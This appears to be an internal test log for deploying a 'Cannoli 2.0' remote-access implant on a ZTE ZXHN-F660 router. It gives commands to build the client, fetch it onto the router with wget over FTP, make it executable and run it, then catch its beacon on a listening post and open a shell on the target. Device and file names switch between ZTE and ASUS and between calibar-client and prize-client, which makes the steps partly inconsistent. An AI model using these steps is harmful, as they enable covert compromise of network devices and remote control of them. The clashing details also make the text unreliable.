JQJCALIBAR - ZXHN-F660
Setup / Test ZTE ZXHN-F660 with ARM5 LE configured Cannoli 2.0 (2/24 - )

Connect ZTE ZXHN LANLocal Area Network side to VLANVirtual Local Area Network 611 for Cannoli LANLocal Area Network side (DHCPDynamic Host Configuration Protocol from DUTDevice Under Test 192.168.1.0/24 / GW = .1)Cannoli-lan-1 VMVirtual Machine should obtain a 192.168.1.0/24 IP address from the F660


On Cannoli LP/LAN side machine (same VMVirtual Machine):
Unzipped Cannoli 2.0 zip in: /home/ndb/calibar/cannoli_v2.0.0/
In /bin/ folder, copied the .cfg example file and make a calibar.cfg file with the LPListening Post IP as the #1 LPListening Post (172.20.13.49)
Run the following command to create client & server files: 
./CCT ../bin/arm5-32-LE-static/client/client calibar-client ../bin/arm5-32-LE-static/server/server calibar-server calibar.cfg
Place the configured Cannoli client binary and the dns.sh script into a directory served via HTTPHypertext Transfer Protocol from the LAN-side machine.
Using a web browser, log in to the web administration page on the router. (This initiates a session, which is required for the following steps to work.)





On LANLocal Area Network VMWith the LANLocal Area Network side computer setup with HTTPHypertext Transfer Protocol access and the calibar-client file on the WWW root folder (/var/www), run the following command to upload the calibar-client file to the ZXHN-F660
wget ftp://192.168.1.4/prize-client
Once prize-client has uploaded, change the permissions#chmod 755 prize-client

With LPListening Post listening (directions below) start the prize-client on the AC68U/tmp# ./prize-client -b &





From Cannoli LPListening Post window:

With the "./calibar-server 9000" already running on the LP... implant beacons back with it's source IP of 172.20.100.254
Beacon was originally set to beacon every 60 seconds
Modify shell.sh example script to set taget_mac to WANWide Area Network mac address (Impant ID) of ASUS
Issued "./shell.sh" command after this to get a shell once the target beacons back again.
type "ls" at new shell prompt and the file system on target is seen
native shell commands are available
